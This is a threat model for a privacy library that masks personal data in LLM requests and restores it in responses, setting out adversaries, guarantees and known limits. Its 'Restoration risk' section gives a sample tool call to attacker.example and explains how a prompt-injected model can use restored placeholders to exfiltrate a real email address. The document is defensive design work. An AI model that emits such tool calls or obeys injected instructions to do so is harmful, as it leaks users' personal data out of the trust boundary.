# Threat model

This document states what vela-privacy protects, against whom, and where its protection stops. It applies to version 0.4.1.

## What Vela does

Vela sits between an application and an LLM provider. On the way out, it detects personal data and secrets in the request and replaces them: structured identifiers with format-preserving FF1 ciphertext, everything else with placeholders such as `[PERSON_1]`. On the way back, it restores the original values in the response, including streamed responses and tool-call arguments.

## Assets

| Asset | Where it lives |
|---|---|
| Original personal data and secrets in prompts | Application memory; the session's replacement map |
| The FF1 key | Process memory; optionally shared between services with `QuantumKeyManager` |
| Session replacement maps (masked ↔ original) | Process memory, for the lifetime of a `MaskSession` |
| Upstream API key | Proxy configuration (`--api-key`) or forwarded client header |
| Raw text sent to an NER service | The NER service (for example Presidio), if configured |

## Trust boundaries

```
 application ──▶ Vela (same process, or proxy on loopback) ──▶ LLM provider
   trusted              trusted                                  untrusted observer
                          │
                          └──▶ NER service (optional)  ── trusted, sees raw text
```

- The application and Vela are trusted and share a host or private network.
- The **LLM provider is the adversary Vela is built for**: assumed to log, retain, and analyse everything it receives.
- An NER service receives **unmasked** text, so it must run inside the trust boundary (same host or private network). The example deployment binds it to loopback.

## Adversaries

1. **The provider or anyone with access to its logs.** Sees every masked request.
2. **A prompt-injected or misbehaving model.** Controls the response text that Vela restores.
3. **A network attacker who can reach the proxy.** Relevant only if the proxy is bound beyond loopback.
4. **A malicious request author.** Sends crafted input to the proxy to crash it, hang it or confuse restoration.

## Guarantees

- **Detected values never leave in clear text.** Every detected entity is replaced. If format-preserving encryption is impossible (domain too small, collision), the value becomes a placeholder instead. Custom entity types are always masked.
- **No cross-session linkability by default.** Without a shared `sessionId`, each session uses a random FF1 tweak, so the same value encrypts differently across sessions. Tweaks are also separated per entity type.
- **Fail closed on routes Vela can't mask.** The proxy masks Chat Completions, Responses (and `input_tokens`), Messages (and `count_tokens`), embeddings, moderations and legacy completions. Body-free requests pass; every other body-carrying route is rejected (HTTP 403, `VelaRouteBlockedError`) unless the operator sets `passthrough: 'all'`. The fetch interceptor applies the same rule on provider hosts and refuses to send an LLM request whose body it can't read as JSON. The client wrappers mask the text methods and throw on the rest (batches, files, `stream()` helpers).
- **Fail closed on infrastructure errors.** If an async recognizer fails or times out, the request is rejected (HTTP 503) unless `recognizerFailure: 'continue'` is set. If a single text exceeds `maxInputChars`, the request is rejected (HTTP 413). In both cases nothing is sent upstream.
- **No values in logs.** The logger records counts and timings only.
- **Linear-time detection.** Every detector regex is tested against adversarial input, and detection time grows linearly with input size.

## Non-guarantees

These are deliberate limits. Users should know them before relying on Vela.

1. **Detection is not complete.** Without an NER service, names and addresses are found by heuristics and are missed in Indian scripts, for rare names and in free-form addresses. On the project's small labelled corpus (80 cases), 10 of 13 names and 5 of 7 addresses are found, and every structured identifier is; the corpus is a regression gate, not a recall estimate. An undetected value is sent as-is.
2. **Format-preserving encryption reveals format.** By design, the provider can see:
   - the length and separators of every encrypted value
   - a card's brand digit
   - a PAN's holder-type letter
   - a GSTIN's state code
   - a phone number's country code
3. **Placeholders reveal type and count.** `[PERSON_3]` tells the provider there are at least three people and which mentions refer to the same one.
4. **Within one session, values are linkable.** A repeated value gets the same ciphertext or placeholder for the whole session. With a shared `sessionId`, that holds across requests.
5. **Partial-name linking restores the full name.** "Joseph" after "Joseph Mathew" shares the full name's placeholder and comes back as "Joseph Mathew". Turn this off with `linkPartialNames: false`.
6. **Placeholder-shaped text across separate calls.** Within one `mask`/`maskValue` call or one request, literal text that looks like a placeholder (`[EMAIL_3]`) is reserved and can't collide. If a *later*, separate `mask()` call in the same session contains a literal equal to a placeholder issued earlier, restoration of the model's echo of it returns the earlier original. No data leaks upstream, but the restored text is wrong.
7. **Context outside text fields is not masked.** Images, audio, file attachments and non-text content blocks pass through unchanged.

## Restoration risk (for the reviewer)

Restoration turns placeholders in the **model's output** back into real values. A prompt-injected model can place a placeholder wherever it likes, for example inside a tool-call argument:

```json
{ "name": "http_get", "arguments": "{\"url\": \"https://attacker.example/?q=[EMAIL_1]\"}" }
```

After restoration, the application receives a tool call whose URL contains the real email address. If the application executes tool calls automatically, the value leaves the trust boundary through the tool, not through the LLM provider.

This is a property of any reversible masking scheme, not a defect in a specific code path, but it should be weighed in review. Mitigation options under consideration (not implemented):

- an option to leave placeholders unrestored in tool-call arguments
- a per-field restore allowlist (restore only `content` text, for example)
- surfacing which placeholders were restored where, so the application can apply policy before executing a tool

Until then, applications that auto-execute tool calls with network access should validate restored arguments before acting on them.

## Operational recommendations

- Bind the proxy to loopback (the default). If you must expose it, put authentication in front of it.
- Run an NER service inside the trust boundary and keep `recognizerFailure: 'block'`.
- Use a fresh session per conversation; use a stable `sessionId` only when provider-side caching or conversation state requires it.
- Keep a fixed `fpeKey` only when several processes must produce identical ciphertext. Otherwise the default random key per process is enough, because restoration uses the session map, not decryption.
